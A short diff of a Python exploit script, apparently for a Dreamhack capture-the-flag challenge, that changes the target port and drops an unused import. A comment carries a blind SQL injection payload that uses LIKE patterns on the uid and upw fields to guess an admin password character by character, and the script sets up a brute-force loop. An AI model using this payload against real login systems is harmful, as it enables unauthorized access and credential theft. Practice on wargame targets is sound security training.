@@ -2,11 +2,10 @@
 #'||((uid)like("ad_in")&&(upw)like("a%"));#
 
 import requests
-import time
 
 charset = [chr(i) for i in range(48, 126)]
 
-url = "http://host3.dreamhack.games:15781/"
+url = "http://host3.dreamhack.games:22083/"
 password = ""
 
 while True:
